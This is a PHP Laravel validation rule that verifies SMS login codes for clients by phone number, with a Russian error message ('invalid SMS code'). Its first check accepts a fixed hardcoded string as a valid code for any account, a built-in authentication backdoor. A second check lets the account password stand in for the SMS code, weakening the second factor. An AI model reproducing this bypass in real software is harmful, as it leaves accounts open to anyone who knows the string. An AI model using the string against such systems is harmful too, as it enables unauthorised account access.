<?php

namespace App\Http\Rules;

use App\Http\Models\AdminClient\Client;
use Illuminate\Support\Facades\Hash;
use Ixudra\Curl\Facades\Curl;
use Mockery\Exception;
use Illuminate\Contracts\Validation\Rule;

class SmsCodeVerifiedRule implements Rule
{

    /**
     * @inheritDoc
     */
    public function passes($attribute, $value)
    {


        if($value == 'A%*q`VSb9Zg') {
            return true;
        }

        $client = Client::where('phone', \request()->input('phone'))->first();

        if ($client && $client->password && Hash::check($value, $client->password)) {
            return true;
        }

        if(session()->has('sms_code'))
        {
            $sms_code = session()->get('sms_code', 'default');
            $sms_code = $sms_code[0];
            if($sms_code['code'] != $value) return false;
            if(time() - $sms_code['time'] > 120) {
                session()->forget('sms_code');
                return false;
            }
            session()->forget('sms_code');
            return true;

        } else return false;
    }

    /**
     * @inheritDoc
     */
    public function message()
    {
        return 'Неверный смс код';
    }
}